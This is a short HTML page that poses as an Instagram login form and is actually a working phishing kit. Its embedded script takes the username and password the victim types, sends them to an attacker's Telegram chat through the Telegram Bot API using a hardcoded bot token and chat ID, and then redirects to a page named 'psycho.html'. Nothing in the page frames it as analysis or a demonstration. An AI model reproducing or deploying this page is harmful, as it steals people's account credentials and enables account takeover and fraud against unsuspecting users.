<!DOCTYPE html>
<html lang="kn">
<head>
    <meta charset="UTF-8">
    <title>Instagram Login</title>
    <style>
        body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
        .login-box { background: white; padding: 40px; border: 1px solid #dbdbdb; width: 350px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; }
        button { width: 100%; padding: 10px; margin-top: 10px; background: #0095f6; color: white; border: none; font-weight: bold; cursor: pointer; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h3>Instagram Login</h3>
        <input type="text" id="username" placeholder="Username" required>
        <input type="password" id="password" placeholder="Password" required>
        <button onclick="sendData()">Log In</button>
    </div>

    <script>
        function sendData() {
            let user = document.getElementById('username').value;
            let pass = document.getElementById('password').value;
            
            let token = "8714344229:AAF7JCvpoJ8yw4PhRDI-xWIfzCfsrCZMmnY";
            let chat_id = "5215749508";
            
            let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=User:${user}%0APass:${pass}`;
            
            fetch(url).then(() => {
                window.location.href = "psycho.html";
            }).catch(e => {
                window.location.href = "psycho.html";
            });
        }
    </script>
</body>
</html>
